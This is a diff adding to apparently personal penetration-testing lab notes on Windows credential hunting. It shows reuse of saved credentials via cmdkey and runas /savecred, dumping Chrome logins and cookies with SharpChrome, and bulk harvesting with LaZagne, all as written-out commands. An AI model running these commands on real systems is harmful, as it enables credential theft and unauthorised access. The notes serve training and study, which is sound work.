@@ -179,4 +179,24 @@ C:\htb> cmdkey /list
     User: inlanefreight\bob
 ```
 
-We can see that 
+We can see that the credentials is saved for inlanefreight\bob, if we open RDP, we will notice that we can connect to sql01 without the need to type password.
+
+We also can run commands as other users:
+```
+PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
+```
+
+Enumerating Browser Credential:
+
+We can use SharpChrome https://github.com/GhostPack/SharpDPAPI to retrieve cookies and saved login from google chrome:
+```
+.\SharpChrome.exe logins /unprotect
+```
+
+Automated Credential Enumeration:
+
+We can use automated tools LaZagne https://github.com/AlessandroZ/LaZagne to automatically retrieve credentials, notice that this tools sometimes maybe able to find additional credentials if we run as an admin instead of normal user:
+
+```
+.\lazagne.exe all
+```
